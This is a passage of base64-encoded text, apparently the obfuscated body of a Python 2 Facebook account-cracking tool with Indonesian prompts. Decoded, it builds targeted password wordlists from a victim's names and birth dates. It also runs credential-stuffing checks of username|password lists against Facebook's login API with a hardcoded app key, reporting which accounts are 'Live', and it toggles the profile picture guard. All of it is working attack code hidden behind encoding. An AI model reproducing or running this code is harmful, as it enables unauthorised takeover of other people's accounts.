gICAgICBsYWluKCkKCgpkZWYgd29yZGxpc3QoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgdHJ5OgogICAgICAgIHRva2V0ID0gb3BlbignbG9naW4udHh0JywgJ3InKS5yZWFkKCkKICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCcKICAgICAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICBsb2dpbigpCiAgICBlbHNlOgogICAgICAgIHRyeToKICAgICAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgICAgIHByaW50IGxvZ28KICAgICAgICAgICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bP10gXHgxYlsxOzkybUlzaSBkYXRhIGxlbmdrYXAgdGFyZ2V0IGRpYmF3YWgnCiAgICAgICAgICAgIHByaW50IDUyICogJ1x4MWJbMTs5N21ceGUyXHg5NVx4OTAnCiAgICAgICAgICAgIGEgPSByYXdfaW5wdXQoJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzkybU5hbWUgRGVwYW4gXHgxYlsxOzk3bTogJykKICAgICAgICAgICAgZmlsZSA9IG9wZW4oYSArICcudHh0JywgJ3cnKQogICAgICAgICAgICBiID0gcmF3X2lucHV0KCdceDFiWzE7OTFtWytdIFx4MWJbMTs5Mm1OYW1lIFRlbmdhaCBceDFiWzE7OTdtOiAnKQogICAgICAgICAgICBjID0gcmF3X2lucHV0KCdceDFiWzE7OTFtWytdIFx4MWJbMTs5Mm1OYW1lIEJlbGFrYW5nIFx4MWJbMTs5N206ICcpCiAgICAgICAgICAgIGQgPSByYXdfaW5wdXQoJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzkybU5hbWUgUGFuZ2dpbGFuIFx4MWJbMTs5N206ICcpCiAgICAgICAgICAgIGUgPSByYXdfaW5wdXQoJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzkybVRhbmdnYWwgTGFoaXIgPlx4MWJbMTs5Nm1leDogfERETU1ZWXwgXHgxYlsxOzk3bTogJykKICAgICAgICAgICAgZiA9IGVbMDoyXQogICAgICAgICAgICBnID0gZVsyOjRdCiAgICAgICAgICAgIGggPSBlWzQ6XQogICAgICAgICAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVs/XSBceDFiWzE7OTNtS2FsbyBKb21ibG8gU0tJUCBhamEgOnYnCiAgICAgICAgICAgIGkgPSByYXdfaW5wdXQoJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzkybU5hbWUgUGFjYXIgXHgxYlsxOzk3bTogJykKICAgICAgICAgICAgaiA9IHJhd19pbnB1dCgnXHgxYlsxOzkxbVsrXSBceDFiWzE7OTJtTmFtZSBQYW5nZ2lsYW4gUGFjYXIgXHgxYlsxOzk3bTogJykKICAgICAgICAgICAgayA9IHJhd19pbnB1dCgnXHgxYlsxOzkxbVsrXSBceDFiWzE7OTJtVGFuZ2dhbCBMYWhpciBQYWNhciA+XHgxYlsxOzk2bWV4OiB8RERNTVlZfCBceDFiWzE7OTdtOiAnKQogICAgICAgICAgICBqYWxhbignXHgxYlsxOzkxbVtceGUyXHg5Y1x4YmFdIFx4MWJbMTs5Mm1QbGVhc2Ugd2FpdCBceDFiWzE7OTdtLi4uJykKICAgICAgICAgICAgbCA9IGtbMDoyXQogICAgICAgICAgICBtID0ga1syOjRdCiAgICAgICAgICAgIG4gPSBrWzQ6XQogICAgICAgICAgICBmaWxlLndyaXRlKCclcyVzXG4lcyVzJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlcyVzXG4lcyVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXMlc1xuJXMlcyVzXG4lcyVzJXNcbiVzJXMlc1xuJXMlcyVzXG4lcyVzJXNcbiVzJXMlc1xuJXMlcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzJyAlIChhLCBjLCBhLCBiLCBiLCBhLCBiLCBjLCBjLCBhLCBjLCBiLCBhLCBhLCBiLCBiLCBjLCBjLCBhLCBkLCBiLCBkLCBjLCBkLCBkLCBkLCBkLCBhLCBkLCBiLCBkLCBjLCBhLCBlLCBhLCBmLCBhLCBnLCBhLCBoLCBiLCBlLCBiLCBmLCBiLCBnLCBiLCBoLCBjLCBlLCBjLCBmLCBjLCBnLCBjLCBoLCBkLCBlLCBkLCBmLCBkLCBnLCBkLCBoLCBlLCBhLCBmLCBhLCBnLCBhLCBoLCBhLCBlLCBiLCBmLCBiLCBnLCBiLCBoLCBiLCBlLCBjLCBmLCBjLCBnLCBjLCBoLCBjLCBlLCBkLCBmLCBkLCBnLCBkLCBoLCBkLCBkLCBkLCBhLCBmLCBnLCBhLCBnLCBoLCBmLCBnLCBmLCBoLCBmLCBmLCBnLCBmLCBnLCBoLCBnLCBnLCBoLCBmLCBoLCBnLCBoLCBoLCBoLCBnLCBmLCBhLCBnLCBoLCBiLCBmLCBnLCBiLCBnLCBoLCBjLCBmLCBnLCBjLCBnLCBoLCBkLCBmLCBnLCBkLCBnLCBoLCBhLCBpLCBhLCBqLCBhLCBrLCBpLCBlLCBpLCBqLCBpLCBrLCBiLCBpLCBiLCBqLCBiLCBrLCBjLCBpLCBjLCBqLCBjLCBrLCBlLCBrLCBqLCBhLCBqLCBiLCBqLCBjLCBqLCBkLCBqLCBqLCBrLCBhLCBrLCBiLCBrLCBjLCBrLCBkLCBrLCBrLCBpLCBsLCBpLCBtLCBpLCBuLCBqLCBsLCBqLCBtLCBqLCBuLCBqLCBrKSkKICAgICAgICAgICAgd2cgPSAwCiAgICAgICAgICAgIHdoaWxlIHdnIDwgMTAwOgogICAgICAgICAgICAgICAgd2cgPSB3ZyArIDEKICAgICAgICAgICAgICAgIGZpbGUud3JpdGUoYSArIHN0cih3ZykgKyAnXG4nKQoKICAgICAgICAgICAgZW4gPSAwCiAgICAgICAgICAgIHdoaWxlIGVuIDwgMTAwOgogICAgICAgICAgICAgICAgZW4gPSBlbiArIDEKICAgICAgICAgICAgICAgIGZpbGUud3JpdGUoaSArIHN0cihlbikgKyAnXG4nKQoKICAgICAgICAgICAgd29yZCA9IDAKICAgICAgICAgICAgd2hpbGUgd29yZCA8IDEwMDoKICAgICAgICAgICAgICAgIHdvcmQgPSB3b3JkICsgMQogICAgICAgICAgICAgICAgZmlsZS53cml0ZShkICsgc3RyKHdvcmQpICsgJ1xuJykKCiAgICAgICAgICAgIGdlbiA9IDAKICAgICAgICAgICAgd2hpbGUgZ2VuIDwgMTAwOgogICAgICAgICAgICAgICAgZ2VuID0gZ2VuICsgMQogICAgICAgICAgICAgICAgZmlsZS53cml0ZShqICsgc3RyKGdlbikgKyAnXG4nKQoKICAgICAgICAgICAgZmlsZS5jbG9zZSgpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMS41KQogICAgICAgICAgICBwcmludCAnXG5ceDFiWzE7OTFtWytdIFx4MWJbMTs5N21TYXZlZCBceDFiWzE7OTFtOiBceDFiWzE7OTdtICVzLnR4dCcgJSBhCiAgICAgICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtQmFjayBceDFiWzE7OTFtXScpCiAgICAgICAgICAgIGxhaW4oKQogICAgICAgIGV4Y2VwdCBJT0Vycm9yIGFzIGU6CiAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIE1ha2UgZmlsZSBmYWlsZWQnCiAgICAgICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtQmFjayBceDFiWzE7OTFtXScpCiAgICAgICAgICAgIGxhaW4oKQoKCmRlZiBjaGVja19ha3VuKCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHRyeToKICAgICAgICB0b2tldCA9IG9wZW4oJ2xvZ2luLnR4dCcsICdyJykucmVhZCgpCiAgICBleGNlcHQgSU9FcnJvcjoKICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBUb2tlbiBub3QgZm91bmQnCiAgICAgICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgbG9naW4oKQogICAgZWxzZToKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBwcmludCBsb2dvCiAgICAgICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKICAgICAgICBwcmludCAnXHgxYlsxOzkxbVs/XSBceDFiWzE7OTJtSXNpIEZpbGVceDFiWzE7OTFtIDogXHgxYlsxOzk3bXVzZXJuYW1lfHBhc3N3b3JkJwogICAgICAgIHByaW50IDUyICogJ1x4MWJbMTs5N21ceGUyXHg5NVx4OTAnCiAgICAgICAgbGl2ZSA9IFtdCiAgICAgICAgY2VrID0gW10KICAgICAgICBkaWUgPSBbXQogICAgICAgIHRyeToKICAgICAgICAgICAgZmlsZSA9IHJhd19pbnB1dCgnXHgxYlsxOzkxbVsrXSBceDFiWzE7OTJtRmlsZSBceDFiWzE7OTFtOlx4MWJbMTs5N20gJykKICAgICAgICAgICAgbGlzdCA9IG9wZW4oZmlsZSwgJ3InKS5yZWFkbGluZXMoKQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBGaWxlIG5vdCBmb3VuZCcKICAgICAgICAgICAgcmF3X2lucHV0KCdcblx4MWJbMTs5MW1bIFx4MWJbMTs5N21CYWNrIFx4MWJbMTs5MW1dJykKICAgICAgICAgICAgbGFpbigpCgogICAgcGVtaXNhaCA9IHJhd19pbnB1dCgnXHgxYlsxOzkxbVsrXSBceDFiWzE7OTJtU2VwYXJhdG9yIFx4MWJbMTs5MW06XHgxYlsxOzk3bSAnKQogICAgamFsYW4oJ1x4MWJbMTs5MW1bXHhlMlx4OWNceGJhXSBceDFiWzE7OTJtUGxlYXNlIHdhaXQgXHgxYlsxOzk3bS4uLicpCiAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgZm9yIG1la2kgaW4gbGlzdDoKICAgICAgICB1c2VybmFtZSwgcGFzc3dvcmQgPSBtZWtpLnN0cmlwKCkuc3BsaXQoc3RyKHBlbWlzYWgpKQogICAgICAgIHVybCA9ICdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9JyArIHVzZXJuYW1lICsgJyZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9JyArIHBhc3N3b3JkICsgJyZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNicKICAgICAgICBkYXRhID0gcmVxdWVzdHMuZ2V0KHVybCkKICAgICAgICBtcHNoID0ganNvbi5sb2FkcyhkYXRhLnRleHQpCiAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gbXBzaDoKICAgICAgICAgICAgbGl2ZS5hcHBlbmQocGFzc3dvcmQpCiAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTdtW1x4MWJbMTs5Mm1MaXZlXHgxYlsxOzk3bV0gIFx4MWJbMTs5N20nICsgdXNlcm5hbWUgKyAnIHwgJyArIHBhc3N3b3JkCiAgICAgICAgZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gbXBzaFsnZXJyb3JfbXNnJ106CiAgICAgICAgICAgIGNlay5hcHBlbmQocGFzc3dvcmQpCiAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTdtW1x4MWJbMTs5M21DaGVja1x4MWJbMTs5N21dIFx4MWJbMTs5N20nICsgdXNlcm5hbWUgKyAnIHwgJyArIHBhc3N3b3JkCiAgICAgICAgZWxzZToKICAgICAgICAgICAgZGllLmFwcGVuZChwYXNzd29yZCkKICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5N21bXHgxYlsxOzkxbURpZVx4MWJbMTs5N21dICBceDFiWzE7OTdtJyArIHVzZXJuYW1lICsgJyB8ICcgKyBwYXNzd29yZAoKICAgIHByaW50ICdcblx4MWJbMTs5MW1bK10gXHgxYlsxOzk3bVRvdGFsXHgxYlsxOzkxbSA6IFx4MWJbMTs5N21MaXZlPVx4MWJbMTs5Mm0nICsgc3RyKGxlbihsaXZlKSkgKyAnIFx4MWJbMTs5N21DaGVjaz1ceDFiWzE7OTNtJyArIHN0cihsZW4oY2VrKSkgKyAnIFx4MWJbMTs5N21EaWU9XHgxYlsxOzkxbScgKyBzdHIobGVuKGRpZSkpCiAgICByYXdfaW5wdXQoJ1xuXHgxYlsxOzkxbVsgXHgxYlsxOzk3bUJhY2sgXHgxYlsxOzkxbV0nKQogICAgbGFpbigpCgoKZGVmIGdydXBzYXlhKCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHRyeToKICAgICAgICB0b2tldCA9IG9wZW4oJ2xvZ2luLnR4dCcsICdyJykucmVhZCgpCiAgICBleGNlcHQgSU9FcnJvcjoKICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBUb2tlbiBub3QgZm91bmQnCiAgICAgICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgbG9naW4oKQogICAgZWxzZToKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBwcmludCBsb2dvCiAgICAgICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKICAgICAgICBqYWxhbignXHgxYlsxOzkxbVtceGUyXHg5Y1x4YmFdIFx4MWJbMTs5Mm1QbGVhc2Ugd2FpdCBceDFiWzE7OTdtLi4uJykKICAgICAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgICAgIHRyeToKICAgICAgICAgICAgdWggPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2dyb3Vwcz9hY2Nlc3NfdG9rZW49JyArIHRva2V0KQogICAgICAgICAgICBndWQgPSBqc29uLmxvYWRzKHVoLnRleHQpCiAgICAgICAgICAgIGZvciBwIGluIGd1ZFsnZGF0YSddOgogICAgICAgICAgICAgICAgbmFtYSA9IHBbJ25hbWUnXQogICAgICAgICAgICAgICAgaWQgPSBwWydpZCddCiAgICAgICAgICAgICAgICBmID0gb3BlbignZ3J1cGlkLnR4dCcsICd3JykKICAgICAgICAgICAgICAgIGxpc3RncnVwLmFwcGVuZChpZCkKICAgICAgICAgICAgICAgIGYud3JpdGUoaWQgKyAnXG4nKQogICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHgxYlsxOzk2bVx4ZTJceDljXHg5M1x4MWJbMTs5MW1dIFx4MWJbMTs5Mm1OYW1lICBceDFiWzE7OTFtOlx4MWJbMTs5N20gJyArIHN0cihuYW1hKQogICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzkybUlEICAgIFx4MWJbMTs5MW06XHgxYlsxOzk3bSAnICsgc3RyKGlkKQogICAgICAgICAgICAgICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bT0nCgogICAgICAgICAgICBwcmludCAnXG5cclx4MWJbMTs5MW1bK10gXHgxYlsxOzk3bVRvdGFsIEdyb3VwIFx4MWJbMTs5Nm0lcycgJSBsZW4obGlzdGdydXApCiAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtWytdIFx4MWJbMTs5N21TYXZlZCBceDFiWzE7OTFtOiBceDFiWzE7OTdtZ3J1cGlkLnR4dCcKICAgICAgICAgICAgZi5jbG9zZSgpCiAgICAgICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtQmFjayBceDFiWzE7OTFtXScpCiAgICAgICAgICAgIGxhaW4oKQogICAgICAgIGV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsIEVPRkVycm9yKToKICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gU3RvcHBlZCcKICAgICAgICAgICAgcmF3X2lucHV0KCdcblx4MWJbMTs5MW1bIFx4MWJbMTs5N21CYWNrIFx4MWJbMTs5MW1dJykKICAgICAgICAgICAgbGFpbigpCiAgICAgICAgZXhjZXB0IEtleUVycm9yOgogICAgICAgICAgICBvcy5yZW1vdmUoJ2dydXBpZC50eHQnKQogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBHcm91cCBub3QgZm91bmQnCiAgICAgICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtQmFjayBceDFiWzE7OTFtXScpCiAgICAgICAgICAgIGxhaW4oKQogICAgICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OWNceDk2XSBObyBjb25uZWN0aW9uJwogICAgICAgICAgICBrZWx1YXIoKQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBFcnJvciB3aGVuIGNyZWF0aW5nIGZpbGUnCiAgICAgICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtQmFjayBceDFiWzE7OTFtXScpCiAgICAgICAgICAgIGxhaW4oKQoKCmRlZiBndWFyZCgpOgogICAgZ2xvYmFsIHRva2V0CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHRyeToKICAgICAgICB0b2tldCA9IG9wZW4oJ2xvZ2luLnR4dCcsICdyJykucmVhZCgpCiAgICBleGNlcHQgSU9FcnJvcjoKICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBUb2tlbiBub3QgZm91bmQnCiAgICAgICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgbG9naW4oKQoKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgcHJpbnQgbG9nbwogICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKICAgIHByaW50ICfilZEtPiBceDFiWzE7Mzc7NDBtMS4gRW5hYmxlJwogICAgcHJpbnQgJ+KVkS0+IFx4MWJbMTszNzs0MG0yLiBEaXNhYmxlJwogICAgcHJpbnQgJ+KVkS0+IFx4MWJbMTszMTs0MG0wLiBCYWNrJwogICAgcHJpbnQgJ1x4MWJbMTszNzs0MG3ilZEnCiAgICBnID0gcmF3X2lucHV0KCfilZrilZBceDFiWzE7OTFt4pa2XHgxYlsxOzk3bSAnKQogICAgaWYgZyA9PSAnMSc6CiAgICAgICAgYWt0aWYgPSAndHJ1ZScKICAgICAgICBnYXoodG9rZXQsIGFrdGlmKQogICAgZWxzZToKICAgICAgICBpZiBnID09ICcyJzoKICAgICAgICAgICAgbm9uID0gJ2ZhbHNlJwogICAgICAgICAgICBnYXoodG9rZXQsIG5vbikKICAgICAgICBlbHNlOgogICAgICAgICAgICBpZiBnID09ICcwJzoKICAgICAgICAgICAgICAgIGxhaW4oKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgaWYgZyA9PSAnJzoKICAgICAgICAgICAgICAgICAgICBrZWx1YXIoKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBrZWx1YXIoKQoKCmRlZiBnZXRfdXNlcmlkKHRva2V0KToKICAgIHVybCA9ICdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZT9hY2Nlc3NfdG9rZW49JXMnICUgdG9rZXQKICAgIHJlcyA9IHJlcXVlc3RzLmdldCh1cmwpCiAgICB1aWQgPSBqc29uLmxvYWRzKHJlcy50ZXh0KQogICAgcmV0dXJuIHVpZFsnaWQnXQoKCmRlZiBnYXoodG9rZXQsIGVuYWJsZT1UcnVlKToKICAgIGlkID0gZ2V0X3VzZXJpZCh0b2tldCkKICAgIGRhdGEgPSAndmFyaWFibGVzPXsiMCI6eyJpc19zaGllbGRlZCI6ICVzLCJzZXNzaW9uX2lkIjoiOWI3ODE5MWMtODRmZC00YWI2LWIwYWEtMTliMzlmMDRhNmJjIiwiYWN0b3JfaWQiOiIlcyIsImNsaWVudF9tdXRhdGlvbl9pZCI6ImIwMzE2ZGQ2LTNmZDYtNGJlYi1hZWQ0LWJiMjljNWRjNjRiMCJ9fSZtZXRob2Q9cG9zdCZkb2NfaWQ9MTQ3NzA0MzI5MjM2NzE4MyZxdWVyeV9uYW1lPUlzU2hpZWxkZWRTZXRNdXRhdGlvbiZzdHJpcF9kZWZhdWx0cz10cnVlJnN0cmlwX251bGxzPXRydWUmbG9jYWxlPWVuX1VTJmNsaWVudF9jb3VudHJ5X2NvZGU9VVMmZmJfYXBpX3JlcV9mcmllbmRseV9uYW1lPUlzU2hpZWxkZWRTZXRNdXRhdGlvbiZmYl9hcGlfY2FsbGVyX2NsYXNzPUlzU2hpZWxkZWRTZXRNdXRhdGlvbicgJSAoZW5hYmxlLCBzdHIoaWQpKQogICAgaGVhZGVycyA9IHsnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsICdBdXRob3JpemF0aW9uJzogJ09BdXRoICVzJyAlIHRva2V0fQogICAgdXJsID0gJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL2dyYXBocWwnCiAgICByZXMgPSByZXF1ZXN0cy5wb3N0KHVybCwgZGF0YT1kYXRhLCBoZWFkZXJzPWhlYWRlcnMpCiAgICBwcmludCByZXMudGV4dAogICAgaWYgJyJpc19zaGllbGRlZCI6dHJ1ZScgaW4gcmVzLnRleHQ6CiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgcHJpbnQgbG9nbwogICAgICAgIHByaW50IDUyICogJ1x4MWJbMTs5N21ceGUyXHg5NVx4OTAnCiAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHgxYlsxOzk2bVx4ZTJceDljXHg5M1x4MWJbMTs5MW1dIFx4MWJbMTs5Mm1BY3RpdmF0ZWQnCiAgICAgICAgcmF3X2lucHV0KCdcblx4MWJbMTs5MW1bIFx4MWJbMTs5N21CYWNrIFx4MWJbMTs5MW1dJykKICAgICAgICBsYWluKCkKICAgIGVsc2U6CiAgICAgICAgaWYgJyJpc19zaGllbGRlZCI6ZmFsc2UnIGluIHJlcy50ZXh0OgogICAgICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICAgICAgcHJpbnQgbG9nbwogICAgICAgICAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtceDFiWzE7OTZtXHhlMlx4OWNceDkzXHgxYlsxOzkxbV0gXHgxYlsxOzkxbURlYWN0aXZhdGVkJwogICAgICAgICAgICByYXdfaW5wdXQoJ1xuXHgxYlsxOzkxbVsgXHgxYlsxOzk3bUJhY2sgXHgxYlsxOzkxbV0nKQogICAgICAgICAgICBsYWluKCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBFcnJvcicKICAgICAgICAgICAga2VsdWFyKCkKCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgoJbG9naW4oKQoK'))